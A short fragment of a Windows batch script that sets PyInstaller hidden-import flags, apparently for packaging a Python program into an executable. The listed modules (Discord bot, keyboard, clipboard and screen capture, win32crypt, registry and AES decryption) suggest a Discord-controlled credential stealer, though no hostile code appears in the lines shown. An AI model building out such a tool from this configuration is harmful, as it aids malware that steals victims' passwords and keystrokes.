...
set "HIDDEN_ARGS=--hidden-import=discord --hidden-import=discord.ext --hidden-import=discord.ext.commands --hidden-import=aiohttp --hidden-import=websockets --hidden-import=yarl --hidden-import=multidict --hidden-import=async_timeout --hidden-import=attrs --hidden-import=idna --hidden-import=nacl --hidden-import=pyautogui --hidden-import=pyperclip --hidden-import=keyboard --hidden-import=sqlite3 --hidden-import=_sqlite3 --hidden-import=asyncio --hidden-import=io --hidden-import=socket --hidden-import=subprocess --hidden-import=os --hidden-import=time --hidden-import=ctypes --hidden-import=webbrowser --hidden-import=threading --hidden-import=json --hidden-import=datetime --hidden-import=shutil --hidden-import=sys --hidden-import=glob --hidden-import=ssl --hidden-import=certifi --hidden-import=random --hidden-import=string --hidden-import=base64 --hidden-import=codecs --hidden-import=argparse --hidden-import=re --hidden-import=struct --hidden-import=urllib3 --hidden-import=pyaes --hidden-import=textwrap --hidden-import=lzma --hidden-import=marshal --hidden-import=logging --hidden-import=win32crypt --hidden-import=traceback --hidden-import=zlib --hidden-import=winreg --hidden-import=requests --hidden-import=tempfile --hidden-import=cryptography --hidden-import=cryptography.hazmat --hidden-import=cryptography.hazmat.primitives --hidden-import=cryptography.hazmat.primitives.ciphers --hidden-import=cryptography.hazmat.primitives.ciphers.aead"
